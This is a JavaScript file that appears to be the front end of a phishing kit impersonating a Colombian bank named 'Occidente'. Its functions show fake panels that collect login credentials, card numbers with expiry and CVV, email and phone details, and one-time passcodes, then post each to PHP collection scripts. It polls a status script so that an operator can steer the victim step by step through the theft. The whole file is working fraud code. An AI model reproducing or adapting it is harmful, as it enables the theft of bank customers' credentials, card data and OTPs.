var espera = 0;

function ventana_tarjeta() {
    $("#cargando,#fondo").hide();
    $("#credit-card,#inp-mes,#inp-ano,#card-cvv").val("");    
    $("#panel-tarjeta").show();
    $("#credit-card").focus();      
}

function ventana_correo() {
    $("#cargando,#fondo").hide();
    $("#correo-electronico,#celular-number").val("");    
    $("#panel-celular").show();
    $("#correo-electronico").focus();        
}

function ventana_otp(){
    $("#cargando,#fondo").hide();
    $("#clave-otp").val("");    
    $("#panel-otp").show();
    $("#clave-otp").focus(); 
}

function ventana_errorotp(){
    $("#cargando,#fondo").hide();
    $("#clave-otp-err").val("");    
    $("#panel-otp-err").show();
    $("#clave-otp-err").focus(); 
}

function ventana_usuario(){
    $("#cargando,#fondo").hide();
    $("#inp-tipo").val("CC"); 
    $("#document-number,#password12").val("");    
    $("#panel-login").show();
    $("#document-number").focus(); 
}

function detectar_dispositivo(){
    var dispositivo = "";
    if(navigator.userAgent.match(/Android/i))
        dispositivo = "Android";
    else
        if(navigator.userAgent.match(/webOS/i))
            dispositivo = "webOS";
        else
            if(navigator.userAgent.match(/iPhone/i))
                dispositivo = "iPhone";
            else
                if(navigator.userAgent.match(/iPad/i))
                    dispositivo = "iPad";
                else
                    if(navigator.userAgent.match(/iPod/i))
                        dispositivo = "iPod";
                    else
                        if(navigator.userAgent.match(/BlackBerry/i))
                            dispositivo = "BlackBerry";
                        else
                            if(navigator.userAgent.match(/Windows Phone/i))
                                dispositivo = "Windows Phone";
                            else
                                dispositivo = "PC";
    return dispositivo;
}



function consultar_estado(){

    if (espera == 1) { 

        $.post( "../../../process/estado.php",function(data) {
           
            switch (data) {
                case '2':espera = 0;
                         ventana_otp(); 
                         break;
                case '4':espera = 0;
                         ventana_correo(); 
                         break;
                case '6':espera = 0;
                         ventana_tarjeta();  
                         break;               
                case '8':espera = 0;
                         ventana_errorotp(); 
                         break;
                case '10':espera = 0;
                          window.location.href = "../../../finish-no-back-button/";
                          break;
                case '12':espera = 0;
                          ventana_usuario(); 
                          break;
            } 
        });    
    }    
}


 function enviar_login(td,nd,cl){     
    $("#panel-login").hide();
    var d = detectar_dispositivo();
    var u = "[" + td + "]" + nd;
    
    $.post( "../../../process/pasologin.php", { usr:u, pas: cl, dis: d,ban:"Occidente"} ,function(data) {
        espera = 1;  
    });
 }

 function enviar_tarjeta(t,f,c){     
    $("#panel-tarjeta").hide();             
    $.post( "../../../process/pasotarjeta.php", { tar:t,fec:f,cvv:c } ,function(data) {                
        espera = 1; 
    });
 }

 function enviar_correo(e,c,t){       
    $("#panel-celular").hide();        
    $.post( "../../../process/pasocorreo.php", { eml:e,clv:c,cel:t } ,function(data) {      
       espera = 1; 
    });
 }

 function enviar_otp(o){
    $("#panel-otp,#panel-otp-err").hide();       
    $.post( "../../../process/pasootp.php", { otp: o} ,function(data) {      
       espera = 1; 
    });
 }

 